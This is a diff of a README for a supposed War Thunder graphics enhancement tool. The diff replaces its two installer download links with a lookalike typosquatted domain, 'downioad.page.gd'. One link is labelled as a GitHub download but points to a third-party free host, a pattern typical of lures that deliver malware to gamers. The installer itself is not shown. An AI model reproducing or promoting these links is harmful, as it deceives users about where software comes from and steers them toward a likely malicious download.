@@ -2,7 +2,7 @@
 
 Welcome to the official repository for the War Thunder Graphics Enhancement Suite 2026. This comprehensive toolset is designed for Windows 10 and 11 users who want to elevate their visual experience in War Thunder through advanced graphics settings, custom HUD configurations, and performance optimization profiles.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -52,7 +52,7 @@ A: No. Once you have applied and saved your settings, they persist in the game's
 
 For the latest stable release, please visit the official download page.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 *This project is an independent community tool and is not affiliated with or endorsed by Gaijin Entertainment or the War Thunder developers. All trademarks belong to their respective owners. Use at your own discretion.*
